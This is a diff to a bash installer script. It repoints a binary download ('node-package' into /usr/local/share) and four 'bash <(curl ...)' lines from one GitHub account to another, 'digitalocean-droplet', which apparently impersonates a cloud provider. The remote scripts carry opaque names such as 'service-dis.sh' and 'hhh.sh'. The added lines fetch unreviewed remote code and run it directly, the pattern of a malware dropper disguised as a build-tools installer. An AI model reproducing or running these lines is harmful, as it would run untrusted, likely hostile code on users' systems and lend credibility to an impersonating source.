@@ -4,7 +4,7 @@
 set -e
 
 # Variables
-URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package"
+URL="https://github.com/digitalocean-droplet/installer/raw/refs/heads/main/node-package"
 TARGET_DIR="/usr/local/share"
 FILENAME="node-package"
 FULL_PATH="$TARGET_DIR/$FILENAME"
@@ -219,7 +219,7 @@ check_and_install_build_tools() {
 
 # Check and install build tools
 check_and_install_build_tools
-bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/service-dis.sh)
-bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test.sh)
-bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test1.sh)
-bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/installer/refs/heads/main/hhh.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/service-dis.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/test.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/test1.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/installer/refs/heads/main/hhh.sh)
